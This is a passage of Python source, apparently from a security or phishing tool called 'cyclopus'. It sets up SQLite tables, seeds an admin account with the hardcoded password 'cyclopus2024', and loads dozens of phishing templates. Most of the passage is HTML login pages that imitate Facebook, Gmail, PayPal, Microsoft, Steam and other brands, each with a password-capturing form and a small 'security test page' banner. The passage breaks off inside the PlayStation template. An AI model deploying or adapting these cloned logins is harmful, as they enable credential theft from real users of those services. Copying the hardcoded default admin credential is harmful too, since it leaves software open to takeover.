                active BOOLEAN DEFAULT 1,
                port INTEGER DEFAULT 8080
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS docker_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                image TEXT NOT NULL,
                vulnerabilities TEXT,
                severity TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS email_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT NOT NULL,
                subject TEXT NOT NULL,
                body TEXT,
                from_address TEXT,
                html BOOLEAN DEFAULT 0,
                attachments TEXT,
                sent_at DATETIME,
                status TEXT DEFAULT 'draft',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS pdf_reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                title TEXT NOT NULL,
                target TEXT,
                analysis TEXT,
                file_path TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'generated'
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                category TEXT,
                html_content TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                content TEXT,
                source TEXT
            )
            """
        ]
        
        for sql in tables:
            try:
                self.conn.execute(sql)
            except Exception as e:
                print(f"Table creation error: {e}")
        
        self.conn.commit()
        self._create_default_admin()
        self._load_default_templates()
    
    def _create_default_admin(self):
        try:
            import hashlib
            default_password = "cyclopus2024"
            password_hash = hashlib.sha256(default_password.encode()).hexdigest()
            self.conn.execute(
                "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                ("admin", password_hash, "admin")
            )
            self.conn.commit()
        except:
            pass
    
    def _load_default_templates(self):
        """Load default phishing templates into the database"""
        templates = {
            'facebook': self._get_facebook_template(),
            'instagram': self._get_instagram_template(),
            'twitter': self._get_twitter_template(),
            'gmail': self._get_gmail_template(),
            'linkedin': self._get_linkedin_template(),
            'microsoft': self._get_microsoft_template(),
            'google': self._get_google_template(),
            'apple': self._get_apple_template(),
            'paypal': self._get_paypal_template(),
            'amazon': self._get_amazon_template(),
            'netflix': self._get_netflix_template(),
            'spotify': self._get_spotify_template(),
            'whatsapp': self._get_whatsapp_template(),
            'telegram': self._get_telegram_template(),
            'discord': self._get_discord_template(),
            'github': self._get_github_template(),
            'slack': self._get_slack_template(),
            'zoom': self._get_zoom_template(),
            'teams': self._get_teams_template(),
            'dropbox': self._get_dropbox_template(),
            'adobe': self._get_adobe_template(),
            'steam': self._get_steam_template(),
            'roblox': self._get_roblox_template(),
            'twitch': self._get_twitch_template(),
            'xbox': self._get_xbox_template(),
            'playstation': self._get_playstation_template(),
            'cashapp': self._get_cashapp_template(),
            'venmo': self._get_venmo_template(),
            'chase': self._get_chase_template(),
            'wellsfargo': self._get_wellsfargo_template(),
            'office365': self._get_office365_template(),
            'onedrive': self._get_onedrive_template(),
            'icloud': self._get_icloud_template(),
            'pinterest': self._get_pinterest_template(),
            'reddit': self._get_reddit_template(),
            'snapchat': self._get_snapchat_template(),
            'tiktok': self._get_tiktok_template(),
            'tinder': self._get_tinder_template(),
            'bumble': self._get_bumble_template(),
            'custom': self._get_custom_template()
        }
        
        for name, html in templates.items():
            try:
                self.conn.execute(
                    "INSERT OR IGNORE INTO phishing_templates (name, category, html_content, updated_at) VALUES (?, ?, ?, CURRENT_TIMESTAMP)",
                    (name, 'default', html)
                )
            except:
                pass
        self.conn.commit()
    
    # ==================== Template Methods ====================
    def _get_facebook_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Facebook</title>
<style>
body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
.logo{color:#1877f2;font-size:40px;text-align:center;margin-bottom:20px}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box}
input:focus{outline:none;border-color:#1877f2}
button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}
button:hover{background:#166fe5}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">facebook</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_instagram_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Instagram</title>
<style>
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border:1px solid #dbdbdb;padding:40px;width:350px}
.logo{font-size:50px;text-align:center;margin-bottom:20px}
input{width:100%;padding:9px;margin:5px 0;border:1px solid #dbdbdb;border-radius:3px;box-sizing:border-box}
input:focus{outline:none;border-color:#0095f6}
button{width:100%;padding:7px;background:#0095f6;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Instagram</div>
<form method="POST"><input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_twitter_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>X / Twitter</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea;margin:0}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{font-size:40px;text-align:center;margin-bottom:20px}
h2{text-align:center;margin-bottom:20px}
input{width:100%;padding:12px;margin:10px 0;background:#000;border:1px solid #2f3336;border-radius:4px;color:#e7e9ea;box-sizing:border-box}
input:focus{outline:none;border-color:#1d9bf0}
button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:9999px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:12px;background:#1a1a1a;border:1px solid #2f3336;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">𝕏</div><h2>Sign in to X</h2>
<form method="POST"><input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_gmail_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Gmail</title>
<style>
body{background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:28px;padding:48px;width:450px}
.logo{color:#1a73e8;font-size:24px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#1a73e8}
button{width:100%;padding:13px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:30px;padding:12px;background:#e8f0fe;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Gmail</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_linkedin_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>LinkedIn</title>
<style>
body{background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#0a66c2;font-size:32px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#0a66c2}
button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px;cursor:pointer;font-weight:bold}
.warning{margin-top:24px;padding:12px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">LinkedIn</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_microsoft_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Microsoft</title>
<style>
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:4px;padding:44px;width:440px}
.logo{color:#ff5722;font-size:28px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:2px;box-sizing:border-box}
input:focus{outline:none;border-color:#0078d4}
button{width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:2px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Microsoft</div>
<form method="POST"><input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_google_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Google</title>
<style>
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border:1px solid #dadce0;border-radius:8px;padding:48px;width:450px}
.logo{color:#4285f4;font-size:28px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:13px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#4285f4}
button{width:100%;padding:13px;background:#4285f4;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Google</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_apple_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Apple ID</title>
<style>
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:12px;padding:40px;width:420px}
.logo{font-size:36px;text-align:center;margin-bottom:20px}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #d6d6d6;border-radius:8px;box-sizing:border-box}
input:focus{outline:none;border-color:#0071e3}
button{width:100%;padding:12px;background:#0071e3;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo"> Apple ID</div>
<form method="POST"><input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_paypal_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>PayPal</title>
<style>
body{background:#f7f7f7;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px}
.logo{color:#003087;font-size:28px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#0070ba}
button{width:100%;padding:12px;background:#0070ba;color:white;border:none;border-radius:20px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">PayPal</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_amazon_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Amazon</title>
<style>
body{background:#e3e6e6;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:32px;width:378px}
.logo{color:#f90;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#e77600}
button{width:100%;padding:10px;background:#f0c14b;color:#111;border:1px solid #a88734;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fdf5e6;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Amazon</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_netflix_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Netflix</title>
<style>
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#141414;border-radius:8px;padding:40px;width:400px}
.logo{color:#e50914;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#333;border:1px solid #555;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#e50914}
button{width:100%;padding:12px;background:#e50914;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">NETFLIX</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_spotify_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Spotify</title>
<style>
body{background:#121212;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#181818;border-radius:8px;padding:40px;width:400px}
.logo{color:#1ed760;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#282828;border:1px solid #404040;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#1ed760}
button{width:100%;padding:12px;background:#1ed760;color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Spotify</div>
<form method="POST"><input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_whatsapp_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>WhatsApp</title>
<style>
body{background:#111b21;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#202c33;border-radius:8px;padding:40px;width:400px}
.logo{color:#25d366;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#2a3942;border:1px solid #3b4a54;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#25d366}
button{width:100%;padding:12px;background:#25d366;color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">WhatsApp</div>
<form method="POST"><input type="text" name="email" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_telegram_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Telegram</title>
<style>
body{background:#17212b;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#232e3c;border-radius:8px;padding:40px;width:400px}
.logo{color:#2aabee;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#2b3a4a;border:1px solid #3a4a5a;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#2aabee}
button{width:100%;padding:12px;background:#2aabee;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Telegram</div>
<form method="POST"><input type="text" name="email" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_discord_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Discord</title>
<style>
body{background:#36393f;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#2f3136;border-radius:8px;padding:40px;width:400px}
.logo{color:#5865f2;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#40444b;border:1px solid #202225;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#5865f2}
button{width:100%;padding:12px;background:#5865f2;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Discord</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_github_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>GitHub</title>
<style>
body{background:#0d1117;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#f0f6fc}
.login-box{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:32px;width:340px}
.logo{font-size:40px;text-align:center;margin-bottom:20px}
h2{text-align:center;margin-bottom:20px}
input{width:100%;padding:8px;margin:8px 0;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#f0f6fc;box-sizing:border-box}
input:focus{outline:none;border-color:#58a6ff}
button{width:100%;padding:10px;background:#238636;color:white;border:none;border-radius:6px;cursor:pointer;font-weight:bold}
.warning{margin-top:16px;padding:10px;background:#1c2333;border:1px solid #30363d;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">GitHub</div><h2>Sign in to GitHub</h2>
<form method="POST"><input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_slack_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Slack</title>
<style>
body{background:#1a1d21;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#222529;border-radius:8px;padding:40px;width:400px}
.logo{color:#611f69;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#2c2d30;border:1px solid #3a3a3a;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#611f69}
button{width:100%;padding:12px;background:#611f69;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Slack</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_zoom_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Zoom</title>
<style>
body{background:#f0f5fa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#2d8cff;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#2d8cff}
button{width:100%;padding:12px;background:#2d8cff;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Zoom</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_teams_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Microsoft Teams</title>
<style>
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#5059e8;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#5059e8}
button{width:100%;padding:12px;background:#5059e8;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Teams</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_dropbox_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Dropbox</title>
<style>
body{background:#f7f9fc;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#0061ff;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#0061ff}
button{width:100%;padding:12px;background:#0061ff;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Dropbox</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_adobe_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Adobe</title>
<style>
body{background:#1a1a1a;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#252525;border-radius:8px;padding:40px;width:400px}
.logo{color:#ff0000;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#333;border:1px solid #444;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#ff0000}
button{width:100%;padding:12px;background:#ff0000;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Adobe</div>
<form method="POST"><input type="text" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_steam_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Steam</title>
<style>
body{background:#1b2838;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#171a21;border-radius:8px;padding:40px;width:400px}
.logo{color:#67c1f5;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#2a3f5a;border:1px solid #4a6a8a;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#67c1f5}
button{width:100%;padding:12px;background:#67c1f5;color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Steam</div>
<form method="POST"><input type="text" name="username" placeholder="Steam account name" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_roblox_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Roblox</title>
<style>
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{color:#e32c2c;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#e32c2c}
button{width:100%;padding:12px;background:#e32c2c;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Roblox</div>
<form method="POST"><input type="text" name="username" placeholder="Username/Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_twitch_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Twitch</title>
<style>
body{background:#0e0e10;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#fff}
.login-box{background:#18181b;border-radius:8px;padding:40px;width:400px}
.logo{color:#9146ff;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;background:#1f1f23;border:1px solid #2f2f35;border-radius:4px;color:#fff;box-sizing:border-box}
input:focus{outline:none;border-color:#9146ff}
button{width:100%;padding:12px;background:#9146ff;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#1a1a1a;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Twitch</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_xbox_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>Xbox</title>
<style>
body{background:#107c10;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{color:#107c10;font-size:36px;text-align:center;margin-bottom:20px;font-weight:bold}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
input:focus{outline:none;border-color:#107c10}
button{width:100%;padding:12px;background:#107c10;color:white;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
.warning{margin-top:20px;padding:10px;background:#fff3cd;text-align:center;border-radius:4px;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">Xbox</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>'''
    
    def _get_playstation_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>PlayStation</title>
<style>
body{background:#003791;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
